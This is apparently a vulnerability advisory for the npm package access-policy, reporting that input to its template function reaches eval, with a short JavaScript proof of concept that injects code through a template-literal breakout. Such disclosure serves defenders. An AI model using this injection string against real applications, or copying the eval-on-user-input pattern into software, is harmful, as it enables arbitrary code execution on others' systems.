## Description

access-policy is a package that encodes and decodes policy JSON files for use with web applications.
Affected versions of this package are vulnerable to Arbitrary Code Execution. User input provided to the <kbd>template</kbd> function is executed by the <kbd>eval</kbd> function resulting in code execution.

## POC

```
var a = require("access-policy");
var statements = '`;console.log(123);//';
data = {};

a.encode(statements,data)
```
 
